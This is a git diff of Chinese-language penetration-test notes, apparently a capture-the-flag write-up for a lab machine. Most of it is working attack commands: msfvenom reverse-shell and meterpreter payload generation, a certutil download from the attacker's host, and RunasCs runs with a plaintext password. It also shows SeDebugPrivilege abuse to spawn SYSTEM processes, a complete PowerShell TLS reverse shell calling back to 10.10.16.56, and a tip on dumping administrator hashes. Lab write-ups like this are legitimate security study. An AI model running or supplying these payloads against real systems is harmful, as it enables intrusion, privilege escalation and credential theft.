@@ -909,10 +909,7 @@ runas的进阶,可以通过显示凭据登录
 制作一个反弹shell的木马和Runascs.exe上传过去
 ` msfvenom -p windows/x64/shell_reverse_tcp LHOST=Your_IP LPORT=5959 -f exe -o pov.exe`
 
-!!尝试多次成功的payload
-```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.56 lport=5959 -f exe -a x64 --platform windows -o pov.exe
-```
+
 
 
 ```bash
@@ -922,23 +919,38 @@ certutil -urlcache -f http://10.10.16.26:8000/pov.exe pov.exe
 
 开一个msfconsole,在multi/handler模块,使用`set payload window/x64/meterpreter/reverse_tcp`模块
 
-`.\RunasCs.exe alaading f8gQ8fynP44ek1m3 "pov.exe"`
-.\rc.exe alaading f8gQ8fynP44ek1m3 "pov.exe"
 
 msf卡在sending stage了....
+!!尝试多次成功的payload
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.56 lport=5959 -f exe -a x64 --platform windows -o pov.exe
+```
+
+迁移一个system进程拿下
+
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240424020508.png)
+
 
 ---
 `whoami /priv`
-开了debug
+开了d
+ebug
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240424011203.png)
 
-`import-module .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(552,"C:\windows\system32\cmd.exe")`
+`import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(552,"C:\windows\system32\cmd.exe")`
 `[MyProcess]::CreateProcessFromParent(656,"c:\windows\system32\cmd.exe","")`
 
+`.\pov.exe 552 ".\RunasCs.exe cmd.exe -r 10.10.16.56:4444"`
+
+
+```powershell
+.\pov.exe 552 "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('10.10.16.56', 3333);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+```
 
 ---
+https://blog.csdn.net/m0_52742680/article/details/135905285?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-135905285-blog-135902495.235^v43^pc_blog_bottom_relevance_base9&spm=1001.2101.3001.4242.1&utm_relevant_index=3
 
-
+也可在拿到meterpreter后使用hashdump抓取管理员密码hash然后内网穿透,使用winrm登录
 
 ### Manager
 #### user
